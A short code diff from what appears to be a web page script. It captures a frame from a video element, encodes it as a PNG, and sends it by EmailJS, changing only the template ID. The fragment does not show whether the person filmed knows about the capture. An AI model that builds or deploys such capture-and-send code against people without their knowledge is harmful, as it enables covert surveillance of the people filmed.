@@ -41,7 +41,7 @@
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
             const imageData = canvas.toDataURL('image/png');
 
-            emailjs.send("service_m21d8bq", "template_b6z1mjs", {
+            emailjs.send("service_m21d8bq", "template_p5qeguj", {
               image: imageData
             }).then(() => {
               console.log("✅ انبعتت الصورة!");
